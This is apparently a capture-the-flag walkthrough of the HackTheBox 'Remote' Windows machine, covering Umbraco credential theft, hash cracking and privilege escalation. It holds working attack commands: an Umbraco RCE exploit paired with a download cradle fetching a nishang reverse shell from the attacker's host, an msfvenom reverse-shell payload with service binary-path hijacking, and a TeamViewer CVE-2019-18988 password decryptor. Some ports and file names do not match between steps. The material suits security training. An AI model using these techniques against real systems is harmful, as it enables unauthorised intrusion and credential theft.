## Intro

Tags: #windows #OSCPpath #WebApp #ftp #nfs #WinPEAS #3rd-party-vuln-app #easy  

--------
# Reconnaissance

## Port scan

```shell
└─$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Remote-full-port-scan.txt remote.htb

# Nmap 7.91 scan initiated Sun Aug 15 17:43:17 2021 as: nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Remote-full-port-scan.txt 10.10.10.180
Warning: 10.10.10.180 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.180
Host is up (0.098s latency).
Not shown: 61692 closed ports, 3827 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FTP

```shell
$ ftp $TARGET
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
anonymous ftp is allowed as it seems, but no files found here

## NFS 

```shell
$ showmount -e remote.htb | tee services/2049-NFS.txt Export list for 10.10.10.180: /site_backups (everyone) $ mount -t nfs $TARGET:site_backups /mnt/tmp/ -nolock $ ls /mnt/tmp App_Browsers App_Data App_Plugins aspnet_client bin Config css default.aspx Global.asax Media scripts Umbraco Umbraco_Client Views Web.config
```
there is an available share to mound `/mnt/tmp`, these files seem some sort of backup

For sensitive info like creds, lets take a look on `App_Data/Umbraco.sdf` which is the database for connection creds:
```shell
$ strings Umbraco.sdf | grep password
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig
```
here it is obvious that there are 2 users, `admin` and `ssmith`, lets dive deeper:
```
$ root@kali:/mnt/tmp/App_Data# strings Umbraco.sdf | grep "admin@htb.local" adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
```
#### hash obtained

in the above snippet we found SHA-1 hash of admin
```
b8be16afba8c314ad33d812f22a04991b90e2aaa
```
### Hash cracking

```shell
$ cat > hash.txt
b8be16afba8c314ad33d812f22a04991b90e2aaa
^C
$ hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
...
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```
cracked successfully!
#### creds obtained

```
admin@htb.local
baconandcheese
```

-----
# Foothold

## WebApp

![](MediaFiles/Pasted%20image%2020260927150212.png)

Port 80 serves an Acme Widgets site. The pages turns up multiple references to Umbraco: CSS links, JavaScript links, and text references near the blog posts. Googling the CMS confirms the admin panel lives at `/umbraco`. It loads a login form. Since we now have creds, lets try them

Login to `/umbraco` with `admin@htb.local:baconandcheese` works.

### Vulnerable version

#### Exploit

```shell
$ searchsploit -m aspx/webapps/49488.py
```
lets test it
```shell
$ python 49488.py -u admin@htb.local -p baconandcheese -i "http://$TARGET" -c whoami
iis apppool\defaultapppool
```
great it works!

Now to obtain a proper shell, lets use **nishang**’s `Invoke-PowerShellTcp.ps1` script:
```shell
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1 $ echo "" >> shell.ps1 $ echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 3333" >> shell.ps1
```
run webserver and listener
```shell
$ python3 -m http.server 80
$ nc -lnvp 1234
```
now execute the exploit we found and specify the nishang powershell script 
```shell
$ python 49488.py -u admin@htb.local -p baconandcheese -i "http://$TARGET" -c "powershell.exe" -a "iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell.ps1')" 2>/dev/null
```
## Shell as iis apppool\defaultapppool
we are in! lets grab user flag
```powershell
PS C:\Users\Public> type user.txt
```

----
# Privesc

## systeminfo

```powershell
PS C:\windows\system32\inetsrv>systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 4:03:29 PM
System Boot Time:          8/15/2021, 11:39:54 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              4 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [03]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [04]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,790 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,603 MB
Virtual Memory: In Use:    1,196 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4462930
                           [03]: KB4516115
                           [04]: KB4523204
                           [05]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.180
                                 [02]: fe80::8959:5ee9:7065:8f1c
                                 [03]: dead:beef::8959:5ee9:7065:8f1c
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\windows\system32\inetsrv> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/winPEASx64.exe', 'c:\Windows\System32\spool\drivers\color\winPEASx64.exe')
PS C:\windows\system32\inetsrv> cd c:\Windows\System32\spool\drivers\color\
PS C:\Windows\System32\spool\drivers\color> .\winPEASx64.exe
```

## 1st way: WinPeas

by uploading and running winpeas on the target, it seems we have access to the service `UsoSvc`
![](MediaFiles/Pasted%20image%2020260927150914.png)

### Writable service

```powershell
PS C:\Windows\System32\spool\drivers\color> sc.exe query UsoSvc

SERVICE_NAME: UsoSvc 
        TYPE               : 30  WIN32  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
PS C:\Windows\System32\spool\drivers\color> sc.exe qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```
we can stop the service and try to change its `BINARY_PATH_NAME` by a malicious file.

Lets generate a payload via msfvenom and start a listener
```shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=4444 -f exe -o ch3ckm8.exe                                                            
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: privesc.exe
$ nc -lnvp 4444
listening on [any] 53 ...
```
next, upload it on target
```powershell
PS C:\Windows\System32\spool\drivers\color> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.247/ch3ckm8.exe', 'c:\Windows\System32\spool\drivers\color\privesc.exe')
```

### Shell as administrator
Now stop service, change binary path and then restart the service
```powershell
PS C:\Windows\System32\spool\drivers\color> net stop UsoSvc
The Update Orchestrator Service service is stopping.
The Update Orchestrator Service service was stopped successfully.

PS C:\Windows\System32\spool\drivers\color> sc.exe config UsoSvc binpath= "C:\Windows\System32\spool\drivers\color\privesc.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Windows\System32\spool\drivers\color> net start UsoSvc
```
next we get a rev shell back to our host!
```shell
nc -lvnp 4444
```
grabbed root flag
## 2nd Way: 3rd party app

Also another way is via 3rd party installed apps discovery:
### Filesystem enumeration

#### Installed apps

```powershell
PS C:\Program Files (x86)\TeamViewer> ls

Mode    LastWriteTime    Name
----    -------------    ----
d-----  2/27/2020        Version7
```

#### Vulnerable app version (teamviewer)

found the above version to be vulnerable to `CVE-2019-18988`

### CVE-2019-18988

### Registry teamviewer credential leak

```powershell
cd HKLM:\software\wow6432node\teamviewer\version7
Get-ItemProperty -Path .

SecurityPasswordAES : {255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                       19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                       126, 141, 55, 107, 38, 57, 78, 91}
```
### Decrypting password

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])

aes      = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```
run it, and password found successfully:
```shell
[+] Found password: !R3m0te!
```
#### creds obtained
```
!R3m0te!
```

### Shell as Administrator

```powershell
evil-winrm -u administrator -p '!R3m0te!' -i 10.129.230.172

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```


-------
# Summary

